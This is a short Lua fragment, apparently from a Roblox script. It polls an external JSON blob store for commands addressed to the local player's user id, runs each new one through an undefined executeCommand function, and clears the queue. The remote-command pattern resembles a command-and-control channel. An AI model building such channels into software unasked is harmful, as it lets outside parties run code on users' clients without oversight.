local function readCommands()
    local commands = jsonblobGet(COMMANDS_BLOB_ID)
    local myCmds = commands[tostring(LP.UserId)] or {}
    
    local newCmds = {}
    for _, cmd in ipairs(myCmds) do
        if not processedCmds[cmd.id] then
            processedCmds[cmd.id] = true
            executeCommand(cmd.sender, cmd.cmd, cmd.data)
        end
    end
    
    -- Очищаем выполненные команды
    commands[tostring(LP.UserId)] = {}
    jsonblobSet(COMMANDS_BLOB_ID, commands)
end

